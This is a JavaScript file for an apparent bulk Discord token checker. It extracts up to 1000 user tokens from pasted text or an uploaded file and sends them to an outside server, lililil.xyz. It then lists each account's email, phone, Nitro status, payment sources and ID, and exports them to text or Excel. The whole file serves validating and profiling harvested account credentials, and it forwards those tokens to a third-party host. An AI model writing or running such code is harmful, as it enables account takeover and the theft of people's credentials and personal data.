sessionStorage.clear();

function readFile() {
    let file = document.getElementById("file").files[0]
    if (file) {
        let reader = new FileReader()
        reader.readAsText(file, "UTF-8")
        reader.onload = function (evt) {
            checkTokens(evt.target.result)
        }
    }
}

function checkTokens(input = document.getElementById("tokens").value) {
    let parsedTokens = [...new Set([...JSON.stringify(input)
        .matchAll(/(mfa\.[\w_\-]{84})|([\w]{24}\.[\w_\-]{6}\.[\w_\-]{27})/g)]
        .map(m => m.slice(1)).flat(Infinity)
        .filter(Boolean)
    )]

    if (parsedTokens.length === 0 || parsedTokens.length > 1000) {
        return alert("Too many tokens or they not found. Limit of amount tokens: 1000")
    }

    let xhr = new XMLHttpRequest()
    xhr.open("POST", "https://lililil.xyz/checker", true)
    xhr.setRequestHeader("Content-type", "application/json")
    xhr.responseType = "json"

    document.getElementById("input_tokens").classList.replace("input_tokens", "hide")
    document.getElementById("loading").classList.replace("hide", "loading")

    xhr.send(JSON.stringify(parsedTokens))
    xhr.onload = function () {
        document.getElementById("loading").classList.replace("loading", "hide")
        document.getElementById("results").classList.replace("hide", "results")

        if (xhr.status !== 200) {
            document.getElementById("input_tokens").classList.replace("hide", "input_tokens")
            document.getElementById("results").classList.replace("results", "hide")
            return alert(xhr.response.message)
        }

        for (let token of Object.keys(xhr.response.tokensData)) {
            if (xhr.response.tokensData[token].status !== "invalid") {
                let phone
                if (xhr.response.tokensData[token].me.phone !== null) {
                    phone = xhr.response.tokensData[token].me.phone
                } else {
                    phone = ""
                }

                let nitro
                if (xhr.response.tokensData[token].me.purchased_flags === 1) {
                    nitro = "Classic"
                } else if (xhr.response.tokensData[token].me.purchased_flags === 2) {
                    nitro = "Boost"
                } else {
                    nitro = ""
                }

                let payment
                if (xhr.response.tokensData[token]["payment-sources"].length > 0) {
                    payment = xhr.response.tokensData[token]["payment-sources"].length
                } else {
                    payment = ""
                }

                document.getElementById("resultBody").innerHTML += `<td>${xhr.response.tokensData[token].status}</td>
                <td>${xhr.response.tokensData[token].me.username}#${xhr.response.tokensData[token].me.discriminator}</td>
                <td>${xhr.response.tokensData[token].me.locale}</td>
                <td>${xhr.response.tokensData[token].me.email}</td>
                <td>${phone}</td>
                <td>${nitro}</td>
                <td>${payment}</td>
                <td>${xhr.response.tokensData[token].me.id}</td>
                <td>${token}</td>`
            } else {
                document.getElementById("resultBody").innerHTML += `<td>${xhr.response.tokensData[token].status}</td>
                <td></td>
                <td></td>
                <td></td>
                <td></td>
                <td></td>
                <td></td>
                <td></td>
                <td>${token}</td>`
            }
        }

        let table = document.getElementById("resultBody")
        let rows = table.rows

        for (let i = 0; i < 2; i++) {
            if (rows[0].getElementsByTagName("TD")[0] === "valid") break
            sortTable(0)
        }

        sessionStorage.setItem('tokensOutput', JSON.stringify(xhr.response));
    }
}

function downloadOutput() {
    let tokensData = JSON.parse(sessionStorage.getItem('tokensOutput'))
    for (let tokenType of Object.keys(tokensData.tokensInfo)) {
        if (tokensData.tokensInfo[tokenType].length === 0) continue
        download(tokenType, tokensData.tokensInfo[tokenType].join("\n"))
    }
    download("json_output.json", JSON.stringify(tokensData, null, "\t"))
}

function download(filename, text) {
    let link = document.createElement("a")
    link.setAttribute("href", "data:text/plaincharset=utf-8," + encodeURIComponent(text))
    link.setAttribute("download", filename)
    link.click()
}

function exportTableToExcel(table = "table", name = "Tokens Data", filename = "tokens_data.xls") {
    let uri = "data:application/vnd.ms-excel;base64,"
    let template = '<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel" xmlns="http://www.w3.org/TR/REC-html40"><title></title><head><!--[if gte mso 9]><xml><x:ExcelWorkbook><x:ExcelWorksheets><x:ExcelWorksheet><x:Name>{worksheet}</x:Name><x:WorksheetOptions><x:DisplayGridlines/></x:WorksheetOptions></x:ExcelWorksheet></x:ExcelWorksheets></x:ExcelWorkbook></xml><![endif]--><meta http-equiv="content-type" content="text/plain charset=UTF-8"/></head><body><table>{table}</table></body></html>'

    let base64 = function (s) {
        return window.btoa(unescape(encodeURIComponent(s)))
    }
    let format = function (s, c) {
        return s.replace(/{(\w+)}/g, function (m, p) {
            return c[p]
        })
    }

    if (!table.nodeType) table = document.getElementById(table)
    let ctx = {worksheet: name || "Worksheet", table: table.innerHTML}

    let link = document.createElement("a")
    link.download = filename
    link.href = uri + base64(format(template, ctx))
    link.click()
}

function sortTable(n) {
    let table, rows, switching, i, x, y, shouldSwitch, dir, switchCount = 0
    table = document.getElementById("resultBody")
    switching = true
    dir = "asc"
    while (switching) {
        switching = false
        rows = table.rows
        for (i = 0; i < (rows.length - 1); i++) {
            shouldSwitch = false
            x = rows[i].getElementsByTagName("TD")[n]
            y = rows[i + 1].getElementsByTagName("TD")[n]
            if (dir === "asc") {
                if (x.innerHTML.toLowerCase() > y.innerHTML.toLowerCase()) {
                    shouldSwitch = true
                    break
                }
            } else if (dir === "desc") {
                if (x.innerHTML.toLowerCase() < y.innerHTML.toLowerCase()) {
                    shouldSwitch = true
                    break
                }
            }
        }
        if (shouldSwitch) {
            rows[i].parentNode.insertBefore(rows[i + 1], rows[i])
            switching = true
            switchCount++
        } else {
            if (switchCount === 0 && dir === "asc") {
                dir = "desc"
                switching = true
            }
        }
    }
}
